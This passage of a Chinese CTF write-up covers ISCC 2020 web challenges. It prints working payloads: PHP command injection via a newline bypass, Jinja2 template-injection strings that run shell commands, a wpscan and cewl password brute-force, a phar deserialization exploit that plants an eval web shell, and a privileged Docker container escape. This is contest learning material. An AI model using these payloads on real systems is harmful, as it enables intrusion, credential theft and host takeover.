            echo $result;
        }
        $result = str_replace("n", "", $result);
        echo $result;
    }
审计可得变量`ip`存在注入，但是代码对`ip`变量进行了特殊字符与字母的过滤
这里因为是`shell_exec`函数并且正则对特殊字符进行了过滤，所以可以使用换行符`%0a`进行截断绕过限制
通过审计绕过限制之后直接命令注入执行读取flag文件
    ?ip=127.0.0.1 %0acat flag.php
    flag{6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma}
## 擂台题-Web
###  Easy Injection
考点：jinja2模板注入
题目提示python模板注入
典型的模板注入案例，没有过滤，直接构造利用payload
    http://101.201.126.95:7050/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /usr/src/app/flog').read()") }}{% endif %}{% endfor %}
    http://101.201.126.95:7050/{{ config.__class__.__init__.__globals__['os'].popen('cat flog').read() }}
**附题目源码**
  * index.py
    #encoding:utf-8
    from flask import Flask,request,render_template_string
    import urllib.request,urllib.parse
    app = Flask(__name__)
    @app.route("/")
    def hello():
        return "python template injection"
    @app.errorhandler(404)
    def page_not_found(error):
        url = urllib.parse.unquote(request.url)
        return render_template_string("URL %s not found"% url), 404
    if __name__ == '__main__':
        app.run(debug=False, host='0.0.0.0', port=80)
###  简简单单，干掉WP
考点：渗透测试
题目打开是一个大家所熟悉的CMS框架Wordpress站点
先查看WP版本：访问`readme.html`或使用`wpscan`进行扫描探测
     → Qftm :~/Desktop# wpscan --url http://94.191.116.98:64555/
    _______________________________________________________________
             __          _______   _____
                      / /  __  / ____|
                 /  / /| |__) | (___   ___  __ _ _ __ ®
                /  / / |  ___/ ___  / __|/ _` | '_ 
                  /  /  | |     ____) | (__| (_| | | | |
                 /  /   |_|    |_____/ ___|__,_|_| |_|
             WordPress Security Scanner by the WPScan Team
                             Version 3.7.6
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    [i] Updating the Database ...
    [i] Update completed.
    [+] URL: http://94.191.116.98:64555/
    [+] Started: Fri May  8 22:38:46 2020
    Interesting Finding(s):
    [+] http://94.191.116.98:64555/
     | Interesting Entries:
     |  - Server: nginx/1.17.10
     |  - X-Powered-By: PHP/7.2.30
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    [+] http://94.191.116.98:64555/robots.txt
     | Interesting Entries:
     |  - /wp-admin/
     |  - /wp-admin/admin-ajax.php
     | Found By: Robots Txt (Aggressive Detection)
     | Confidence: 100%
    [+] http://94.191.116.98:64555/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
    [+] http://94.191.116.98:64555/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    [+] http://94.191.116.98:64555/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    [+] WordPress version 5.4.1 identified (Latest, released on 2020-04-29).
     | Found By: Rss Generator (Passive Detection)
     |  - http://94.191.116.98:64555/feed/, https://wordpress.org/?v=5.4.1
     |  - http://94.191.116.98:64555/comments/feed/, https://wordpress.org/?v=5.4.1
    [+] WordPress theme in use: twentyseventeen
     | Location: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/
     | Latest Version: 2.3 (up to date)
     | Last Updated: 2020-03-31T00:00:00.000Z
     | Readme: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/readme.txt
     | Style URL: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507
     | Style Name: Twenty Seventeen
     | Style URI: https://wordpress.org/themes/twentyseventeen/
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     | Confirmed By: Css Style In 404 Page (Passive Detection)
     |
     | Version: 2.3 (80% confidence)
     | Found By: Style (Aggressive Detection)
     |  - http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
    [+] Enumerating All Plugins (via Passive Methods)
    [i] No plugins Found.
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:00  (21 / 21) 100.00% Time: 00:00:00
    [i] No Config Backups Found.
    [!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
    [+] Finished: Fri May  8 22:42:30 2020
    [+] Requests Done: 70
    [+] Cached Requests: 3
    [+] Data Sent: 14.687 KB
    [+] Data Received: 15.181 MB
    [+] Memory used: 178.301 MB
    [+] Elapsed time: 00:03:44
访问`http://94.191.116.98:64555/robots.txt`得到后台页面
    http://94.191.116.98:64555/wp-login.php
想办法登录网站，使用`wpscan`探测网站有哪些用户
    wpscan --url http://94.191.116.98:64555 -e u
    [i] User(s) Identified:
    [+] admin
     | Found By: Author Posts - Author Pattern (Passive Detection)
     | Confirmed By:
     |  Rss Generator (Passive Detection)
     |  Wp Json Api (Aggressive Detection)
     |   - http://94.191.116.98:64555/wp-json/wp/v2/users/?per_page=100&page=1
     |  Rss Generator (Aggressive Detection)
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)
    [+] jerry
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
探测到存在`admin和jerry`两个网站用户，将用户存储在文件`user`中
下来使用`cewl`根据网站生成破解密码`pass`
    cewl http://94.191.116.98:64555/ -w pass
通过`wpscan`利用生成的user和pass两个文件进行破解验证后台
    wpscan --url http://94.191.116.98:64555 -U user -P pass
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:00  (21 / 21) 100.00% Time: 00:00:00
    [i] No Config Backups Found.
    [+] Performing password attack on Xmlrpc against 2 user/s
    [SUCCESS] - jerry / egIsNNNnotHe                                                                            
    Trying admin / Author Time: 00:00:02  (106 / 106) 100.00% Time: 00:00:02
    [i] Valid Combinations Found:
     | Username: jerry, Password: egIsNNNnotHe
验证结果得到网站后台一组用户名和密码
    Username: jerry, Password: egIsNNNnotHe
使用得到的账户名和密码登录后台，拿到flag
    flag{wEak_pAsS_1s_deNge20us}
###  大黑阔
考点：phar反序列化、Docker逃逸提权
题目上来就是一个上传界面，不用说就有过滤【只能上传gif】，对网站进行敏感信息收集
泄露网站源码`www.zip`，下载源码
upload.php
show.php
     output);
        }
    }
    file_exists($filename);
分析源码，可知可以利用phar反序列化进行利用，主要是因为show.php存在phar反序列化可用点：类AnyClass和函数file_exists()，file_exists在处理phar文件时会反序列化phar文件中用户自定义的meta-data字段，其中phar文件类型不由后缀决定
编写脚本生成具有攻击载荷的phar文件
    startBuffering();
    $phar -> setStub('');
    $object = new AnyClass();
    $object ->output= 'eval(@$_POST['q']);';
    $phar->setMetadata($object); 
    $phar->addFromString("a", "a"); 
    $phar->stopBuffering();
    ?>
查看生成的phar文件
    00000000  3C 3F 70 68  70 20 5F 5F   48 41 4C 54  5F 43 4F 4D  ..j..
    00000020  00 01 00 00  00 11 00 00   00 01 00 00  00 00 00 3B  ...............;
    00000030  00 00 00 4F  3A 38 3A 22   41 6E 79 43  6C 61 73 73  ...O:8:"AnyClass
    00000040  22 3A 31 3A  7B 73 3A 36   3A 22 6F 75  74 70 75 74  ":1:{s:6:"output
    00000050  22 3B 73 3A  31 39 3A 22   65 76 61 6C  28 40 24 5F  ";s:19:"eval(@$_
    00000060  50 4F 53 54  5B 27 71 27   5D 29 3B 22  3B 7D 01 00  POST['q']);";}..
    00000070  00 00 61 01  00 00 00 52   48 CA 5E 01  00 00 00 43  ..a....RH.^....C
    00000080  BE B7 E8 B6  01 00 00 00   00 00 00 61  98 14 3A DC  ...........a..:.
    00000090  67 2A 62 13  5F C6 2F 99   A8 27 BA 44  F5 32 B3 5F  g*b._./..'.D.2._
    000000A0  02 00 00 00  47 42 4D 42                             ....GBMB
对于本地生成的phar文件，依据上传限制，直接更改phar文件后缀为gif，上传phar.gif直接Getshell
在服务器上没有找到flag，可能权限不够，由于服务器上开着docker，并且www用户可以直接操作docker的部署
下来直接利用docker启动特权容器或者cap-add=SYS_ADMIN（或映射宿主机文件到容器中）
    docker run -it --privileged=true ubuntu /bin/bash
此时docker容器具有mount权限，进入容器挂载宿主机目录到容器中，修改宿主机的`/etc/passwd`进行提取得到flag
    flag{Nobody_knows_Hackuoer_better_than_me}
## 总结
不谈ISCC赛制怎么样，对于不同阶段的人也是有一定的学习和提高。